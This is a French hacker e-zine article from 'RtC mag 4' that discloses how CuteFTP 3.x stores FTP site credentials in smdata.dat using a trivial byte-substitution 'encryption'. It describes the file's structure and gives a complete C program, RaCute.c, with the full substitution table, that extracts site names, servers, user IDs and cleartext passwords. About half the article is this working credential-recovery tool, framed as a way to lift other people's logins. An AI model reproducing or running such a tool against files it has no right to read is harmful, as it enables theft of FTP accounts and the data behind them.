@@ -1,0 +1,194 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  Faille CuteFTP  ]
+---------[ in RtC mag 4 ]
+----[  by Recursiver <recursiver@caramail.com>  ]
+
+
+-------[  Des logins/pass FTP rapides ou pourquoi les programmeurs de CuteFTP sont des flemards..
+
+    CuteFTP est un sinon LE client FTP le plus connus et le plus utilisé sous windows. Pourtant il presente une ENORME faille de securite car tout le monde le sais, sous zindozs, on peut pas (ou difficilement) proteger ses fichiers en lecture (en ecriture non plus on peut pas:(
+
+    La faille de CuteFTP est d'enregistrer les pass des sites que vous avez entrer dans sa base de donnees(donc les enregistrer dans un fichier sur le hd plus ou MOINS crypter).
+
+    Le fichier ou CuteFTP enregistre tout ca c'est smdata.dat qui se trouve dans le rep. ou vous avez avez installer CuteFTP. Quand on explore ce fichier on se rend compte que les programmeurs de ce soft etait bourre d'acide quand il l'on code : le cryptage utilise est totalemnet inutile! C'est juste un substitution de caracteres! Par exemple a=e, u=d...
+
+    Ben maintenenant il ne suffit plus que de decoder tout ca :
+    Apres plusieurs dizaine de minutes a etudier ce putaint de fichier je trouve comment il est structuré:
+- L'octets 80 (128 en decimal) delimite chaque site.
+- Il y a plus ou moins de champs par site(selon si on a rempli ou non tous les champs pendant l'ajout du site dans la base de donnees de CuteFTP) dans l'ordre : nom du site, adresse du serveurFTP, UserID, Pass...apres on s'en fout..
+- Le premier caractere de chaque champ correspond au nombre de caractere du champ.
+
+    Humm...c pas trop clair ca...J'vais vous faire un exemple. Je lance CuteFTP. J'ajoute un nouveau site dans sa base de donnee :
+label : tf1.fr
+serveur FTP : ftp.tf1.fr
+UserID : tf1
+pass : ********** <==j'ai taper azerty1234
+
+    Dans le fichier smdata.dat, ce nouveau site sera code comme ca a la suite des autres :
+
+80 06 't' 'f' '1' '.' 'f' 'r' 0a 'f' 't' 'p' '.' 't' 'f' '1' '.' 'f' 'r'
+03 't' 'f' '1' 0a 88 a5 b2 c6 96 66 88 99 b6 c2
+(le pass ne correspond pas mais j'espere que vous avez compris)
+
+    Le deuxieme octet de cet exemple est 06 ce nombre correspond au nombre d'octets (et donc au nombre de carateres) que fait le champ d'apres, la c'est le nom du site : tf1.fr <== il y a bien 6 caracteres. J'espere que je me suis fait comprendre :)
+
+    Apres, une fois qu'on a degager tout les champ c tout easy, comme je vous l'ai dit a chaque octet du mot de passe en correspond un autre, il y a donc une table de conversion:
+
+octet* "cryptes"		octet clair			*en decimal
+128						'H'
+129						'I'
+130						'J'
+131						'K'
+132						'L'
+..etc...
+
+    Si vous la voulez entiere, trouvez la tout seul ou pompez la du programme qui suit (J'vais pas m'amuser a la recopier entiere...Moi aussi j'uis flemard!).
+
+
+-------[  Un peu de code
+
+
+    Le programme est en C et tourne sous Linux, il prend comme argument le fichier smdata.dat et comme deuxieme argument(facultatif) le fichier de sortie(ou vont etre ecrite les donnees sorties du fichier :
+nom du site, serveurFTP, login, Pass 
+    Si rien n'est rien specifier comme 2eme argument, sortie vers stdout.
+
+
+--- RaCute.c ------------------------------------------------------------------
+
+/* RaCute.c Coded by Recursiver<recursiver@caramail.com> le 30/08/2000 
+ * Ce programme "decrypte"(si on peut appeler ca decrypter :()
+ * le fichier smdata.dat de Cute FTP version 3.x ( les versions anterieures 
+ * doivent etre du meme style et il faut esperer que les versions superieur 
+ * soit un peu mieux crypter...)
+ * Pour compiler :
+ * # gcc -o RaCute RaCute.c
+ * Le premier argument de RaCute est le chemin du fichier smdata.dat et le  
+ * deuxieme(facultatif) et le fichier ou devront etre enregistrer les donnees
+ * sortie de smdata.dat, si il n'y a pas de 2eme argument, appuyer sur ENTREE
+ * pour faire defiler les sites sur le terminal. */
+ 
+#include <stdio.h>
+#include <errno.h>
+#include <stdlib.h>
+
+#define C ' '
+
+char *decriptPass(char *crypt);
+char *takechamp(FILE *fptr); 
+
+int main(int argc, char *argv[]) {
+
+  FILE *fptr;
+  FILE *fileout;
+  int buffer;
+  int i;
+  char *champ;
+  char *label[3] = {"Nom du site", "Adresse du server", "UserID"}; 
+  char *pass;
+
+  if (argc != 2 && argc != 3) {
+    fprintf(stderr, "Usage: %s <cutefile> [outputfile]\n", argv[0]);
+    exit(0);
+  }
+  
+  printf("RaCute by Recursiver <recursiver@caramail.com>\n");
+  printf("Ouverture de %s..\n", argv[1]);
+  if (argc == 3 ) {
+    printf("Ouverture de %s..\n", argv[2]);
+    if ((fileout = freopen(argv[2], "w", stdout)) == NULL)
+      perror("Erreur dans l'ouverture du fichier");
+  }
+    
+  
+  if ((fptr = fopen(argv[1], "r")) == NULL) {
+    perror("Erreur dans l'ouverure du fichier");
+    exit(0);
+  }
+  while(1) { 
+    while((buffer = fgetc(fptr)) != 128)
+      if (buffer == EOF)
+        return 0;
+    for (i=0 ; i <= 3 ; i++) {
+      if ((champ = takechamp(fptr)) == NULL) {
+	printf("Rien de plus :(\n");
+	break;
+      }
+      if (i == 3) {
+	pass = decriptPass(champ);
+	if (argc == 2) {
+	  printf("Password = \033[1;31m %s \033[0m\n", pass);
+          }   
+	else
+	  printf("Password = %s\n\n", pass);
+	free(pass); 
+      }
+      else 
+	printf("%s = %s\n", label[i], champ);            
+      free(champ);
+    }
+    if (argc == 2)
+      getchar();
+  }
+  putchar('\n');
+  if (argc == 3)
+    fclose(fileout);
+  fclose(fptr);
+  return 0;
+}
+
+char *takechamp(FILE *fptr) {
+  register int i;
+  int lchamp; 
+  char buffer;
+  char *champ;
+  
+  if ((lchamp = fgetc(fptr)) == 0)
+    return NULL;
+  champ = malloc(lchamp + 1);
+
+  for(i=0 ; i <=  lchamp-1 ; i++) {
+    buffer = fgetc(fptr);
+    champ[i] = buffer;
+  }
+  champ[i] = '\0';
+  return (champ);
+}
+
+char *decriptPass(char *crypt) {
+  char table[] = {'H','I','J','K','L','M','N','O','@',
+		  'A','B','C','D','E','F','G','X','Y',
+		  'Z','[','\\',']','^','_','P','Q','R',
+		  'S','T','U','V','W',
+		  'h','i','j','k','l','m','n','o','`',
+		  'a','b','c','d','e','f','g','x','y',
+		  'z','{','|','}','~',C,'p','q','r',
+		  's','t','u','v','w',C,C,C,C,
+		  C,C,C,C,C,C,C,C,C,
+		  C,C,C,C,C,C,C,C,C,
+		  C,C,C,C,C,C,C,C,C,
+		  C,'(',')','*','+',',','-','.','/',
+		  C,'!','"','#','$','%','&',C,'8',
+		  '9',':',';','<','=','>','?','0','1',
+		  '2','3','4','5','6','7','8','9'};
+  char *clair;
+  int i;
+
+  clair = malloc(strlen(crypt) + 1);
+  for (i=0 ; crypt[i] != '\0' ; i++) {
+    if ((unsigned char)crypt[i] >= 128)
+      clair[i] = table[(unsigned char)crypt[i] - 128];
+    else
+      clair[i] = C;
+  }
+  clair[i] = '\0';
+  return (clair);
+}
+
+--- RaCute.c ------------------------------------------------------------------
+
+    Et voila, moi je suis content j'ai trouver quelqu'un encore plus flemard que moi :)
+    Si vous avez des remarques, des suggestions... mailto:recursiver@caramail.com
+
+
+-------[  EOF
